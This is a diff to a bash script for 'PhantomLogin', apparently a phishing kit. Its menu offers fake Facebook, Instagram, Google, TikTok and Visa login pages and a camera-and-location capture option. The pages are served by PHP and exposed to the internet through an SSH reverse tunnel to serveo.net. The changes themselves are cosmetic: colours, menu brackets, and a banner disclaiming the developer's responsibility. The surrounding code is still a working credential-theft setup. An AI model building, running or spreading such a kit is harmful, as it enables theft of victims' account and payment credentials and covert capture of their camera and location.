@@ -905,7 +905,7 @@ start_serveo_server() {
     echo -e "${GREEN}[+] Starting PHP server on localhost...${NC}"
     php -S localhost:3333 > /dev/null 2>&1 &
     php_pid=$!
-    echo -e "${GREEN}[+] PHP server started at http://localhost:3333/${page}.html${NC}"
+    echo -e "${RED}[+] PHP server started at http://localhost:3333/${page}.html${NC}"
 
     echo -e "${GREEN}[+] Starting SSH tunnel with Serveo...${NC}"
     ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net > sendlink 2>&1 &
@@ -919,7 +919,7 @@ start_serveo_server() {
         exit 1
     fi
 
-    echo -e "${GREEN}[+] Serveo URL: ${serveo_url}/${page}.html${NC}"
+    echo -e "${BLUE}[+] Serveo URL: ${serveo_url}/${page}.html${NC}"
     echo -e "${YELLOW}[+] Press Ctrl+C to stop the server.${NC}"
 
     trap "kill $php_pid $ssh_pid 2> /dev/null" EXIT
@@ -942,14 +942,16 @@ display_logs() {
     done
 }
 show_menu() {
-    echo -e "${GREEN}Welcome to PhantomLogin${NC}"
+    echo -e "${GREEN}Welcome to PhantomLogin-DF... ${NC}"
+    echo -e "${GREEN}The developer is not responsible for any incorrect use of the tool... ${NC}"
+    echo -e "${GREEN}All rights reserved:Mohamed Abu Al-Saud ${NC}"
     echo -e "${YELLOW}=================================${NC}"
-    echo -e "${BLUE}1. Facebook login${NC}"
-    echo -e "${BLUE}2. Instagram login${NC}"
-    echo -e "${BLUE}3. Google login${NC}"
-    echo -e "${BLUE}4. TikTok login${NC}"
-    echo -e "${BLUE}5. Visa login${NC}"
-    echo -e "${BLUE}6. Camera and location${NC}"
+    echo -e "${BLUE}[1] Facebook login${NC}"
+    echo -e "${BLUE}[2] Instagram login${NC}"
+    echo -e "${BLUE}[3] Google login${NC}"
+    echo -e "${BLUE}[4] TikTok login${NC}"
+    echo -e "${BLUE}[5] Visa login${NC}"
+    echo -e "${BLUE}[6] Camera and location${NC}"
     echo -e "${YELLOW}=================================${NC}"
 }
 
@@ -998,8 +1000,8 @@ case $choice in
 esac
 
 echo -e "${GREEN}[+] Choose server type:${NC}"
-echo -e "${BLUE}1. Localhost${NC}"
-echo -e "${BLUE}2. Serveo.net${NC}"
+echo -e "${RED}[1] Localhost${NC}"
+echo -e "${RED}[2] Serveo.net${NC}"
 read server_choice
 
 case $server_choice in
